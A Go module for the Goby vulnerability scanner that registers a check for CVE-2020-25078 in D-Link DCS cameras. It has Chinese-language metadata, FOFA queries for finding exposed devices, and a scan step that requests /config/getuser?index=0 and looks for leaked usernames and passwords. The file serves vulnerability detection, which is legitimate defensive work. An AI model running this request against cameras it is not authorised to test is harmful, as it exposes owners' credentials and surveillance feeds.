package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "D-Link DCS系列监控 信息泄露漏洞 （CVE-2020-25078）",
    "Description": "<p>D-Link 网络摄像机为家庭和小型办公用户提供最新和全面的监视系统。它通过连接到宽带互联网或本地网络来提供远程高质量的音频和视频监控。</p><p>D-Link DCS系列监控通过访问特定的URL得到账号密码信息，攻击者通过漏洞进入后台可以获取视频监控页面。</p>",
    "Product": "D-Link DCS系列监控",
    "Homepage": "http://www.dlink.com.cn/",
    "DisclosureDate": "2020-09-02",
    "Author": "",
    "FofaQuery": "((header=\"realm=\\\"DCS-\" && header!=\"D-Link Internet Camera\" && header!=\"couchdb\") || (banner=\"realm=\\\"DCS-\" && banner!=\"D-Link Internet Camera\" && banner!=\"couchdb\"))",
    "Level": "1",
    "Impact": "<p>D-Link DCS系列监控存在信息泄露漏洞，攻击者利用泄漏的敏感信息，进入后台可以获取视频监控页面。</p>",
    "VulType": [
        "信息泄露"
    ],
    "Tags": [
        "信息泄露"
    ],
    "CVEIDs": [
        "CVE-2020-25078"
    ],
    "CNNVD": [
        "CNNVD-202009-083"
    ],
    "CNVD": [],
    "Is0day": false,
    "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：:<a href=\"http://www.dlink.com.cn/\">http://www.dlink.com.cn/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。2、如⾮必要，禁⽌公⽹访问该系统。</p>",
    "Translation": {
        "CN": {
            "Name": "D-Link DCS系列监控 信息泄露漏洞 （CVE-2020-25078）",
            "Description": "<p>D-Link 网络摄像机为家庭和小型办公用户提供最新和全面的监视系统。它通过连接到宽带互联网或本地网络来提供远程高质量的音频和视频监控。</p><p>D-Link DCS系列监控通过访问特定的URL得到账号密码信息，攻击者通过漏洞进入后台可以获取视频监控页面。</p>",
            "Tags": [
                "信息泄露"
            ],
            "VulType": [
                "信息泄露"
            ],
            "Impact": "<p>D-Link DCS系列监控存在信息泄露漏洞，攻击者利用泄漏的敏感信息，进入后台可以获取视频监控页面。</p>",
            "Recommendation": "<p>官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"http://www.dlink.com.cn/\" rel=\"nofollow\">http://www.dlink.com.cn/</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。2、如⾮必要，禁⽌公⽹访问该系统。<br></p>"
        }
    },
    "References": [
        "http://wiki.peiqi.tech/PeiQi_Wiki/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/D-Link/D-Link%20DCS%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7%20%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%20CVE-2020-25078.html"
    ],
    "HasExp": false,
    "ExpParams": null,
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "",
                "data_type": "text",
                "follow_redirect": true,
                "method": "GET",
                "uri": "/config/getuser?index=0",
                "header": {}
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "name",
                        "variable": "$body"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "pass",
                        "variable": "$body"
                    }
                ],
                "operation": "AND",
                "type": "group"
            }
        }
    ],
    "ExploitSteps": null,
    "CVSSScore": "6.5",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "GobyQuery": "((header=\"realm=\\\"DCS-\" && header!=\"D-Link Internet Camera\" && header!=\"couchdb\") || (banner=\"realm=\\\"DCS-\" && banner!=\"D-Link Internet Camera\" && banner!=\"couchdb\"))",
    "PocId": "10175"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}

//  "FofaQuery": "app=\"D_Link-DCS-2530L\" || app=\"D_Link-DCS-2670L\" || app=\"D_Link-DCS-4603\" || app=\"D_Link-DCS-4622\" || app=\"D_Link-DCS-4701E\" || app=\"D_Link-DCS-4703E\" || app=\"D_Link-DCS-4705E\" || app=\"D_Link-DCS-2530L\" || app=\"D_Link-DCS-4802E\" || app=\"D_Link-DCS-P703\"",
